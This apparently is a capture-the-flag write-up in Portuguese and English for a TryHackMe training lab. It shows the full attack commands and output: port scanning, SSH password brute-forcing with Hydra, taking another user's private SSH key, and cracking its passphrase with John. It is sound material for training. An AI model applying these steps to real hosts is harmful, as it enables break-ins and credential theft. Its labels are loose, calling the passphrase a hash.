# Writeup Basic Pentest TryHackMe
# TryHackMe Room: https://tryhackme.com/room/basicpentestingjt
# By: LGL5
# IP-MACHINE: IP of machine "try hack me" 
1- nmap scan host:

#nmap -sV 10.10.52.205
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-19 10:30 -03
Nmap scan report for 10.10.52.205
Host is up (0.31s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8009/tcp open  ajp13?
8080/tcp open  http-proxy

2- Listando Diretorios Apache:
#gobuster dir -u http://10.10.52.205 -w /usr/share/wordlists/dirb/common.txt

3- enumerando usuarios apache
#enum4linux -a 10.10.52.205
result: 
...
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)

4- Hydra brute force na porta ssh:
#hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.52.205
Result:
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-19 11:23:37
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.52.205:22/
[STATUS] 177.00 tries/min, 177 tries in 00:01h, 14344223 to do in 1350:41h, 16 active
[STATUS] 112.67 tries/min, 338 tries in 00:03h, 14344063 to do in 2121:55h, 16 active
[22][ssh] host: 10.10.52.205   login: jan   password: armando  <-- SENHA ENCONTRADA

5- Realizar conexão ssh com o server:
ssh jan@10.10.52.205 <--- SSH RODANDO NA PORTA 22 DEFAULT

6- Acessar diretorios do usuario kay:
$cd /home/kay

7- Listar diretorios do Kay:
$ls -lah

8- Acessar arquivo id_rsa:
$vim id_rsa <--- COPIAR DADOS

9- Utilizando o John the crack hash: 
No computador do atacante:
	-Criar arquivo id_rsa;
	-Rodar comando do John:
	#python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
	- Crack HASH:
	#/usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
	retorna a hash: beeswax
 	

 Agora temos o hash crackeado do usuário, kay. Lembre-se de que esta não é a senha do usuário ssh, mas sim o hash crackeado da chave privada que encontramos no diretório do usuário kay que foi acessado por conexão com Jan via ssh. Portanto, precisamos aplicar o hash crackeado via usuário Jan como mostrado abaixo

 10- Acessar via ssh o usuario Kay via usuario JAN:
 No computador do atacado via usuario jan
 	$ssh -i /home/kay/.ssh/id_rsa kay@10.10.52.205
 	Coloque o Hash crackeado quando solicitado a senha;

 11- Listando os diretorios no usuario Kay:
 $ls -lah
 Sera encontrado o arquivo "pass.bak" <--A ULTIMA KEY ESTARA NESTE ARQUIVO
 $vim pass.bak	

 fim.
